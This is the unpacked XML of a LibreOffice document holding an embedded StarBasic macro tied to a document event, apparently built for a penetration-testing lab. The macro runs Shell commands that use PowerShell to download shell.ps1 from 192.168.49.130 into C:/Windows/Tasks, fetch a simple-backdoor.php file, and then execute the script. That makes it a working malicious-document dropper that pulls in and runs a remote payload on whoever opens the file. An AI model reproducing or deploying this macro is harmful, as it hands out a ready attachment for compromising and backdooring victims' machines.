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craft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craft1.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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9:18:07.998330643</meta:creation-date>
    <dc:date>2022-05-07T20:10:24.498250326</dc:date>
    <meta:editing-duration>PT16M4S</meta:editing-duration>
    <meta:editing-cycles>9</meta:editing-cycles>
    <meta:generator>LibreOffice/7.3.1.3$Linux_X86_64 LibreOffice_project/3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craft1.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="craft1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell iwr http://192.168.49.130/shell.ps1 -o C:/Windows/Tasks/shell.ps1")
	Shell("cmd /c powershell iwr http://192.168.49.130/simple-backdoor.php")
	Shell("cmd /c powershell -c C:/Windows/Tasks/shell.ps1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af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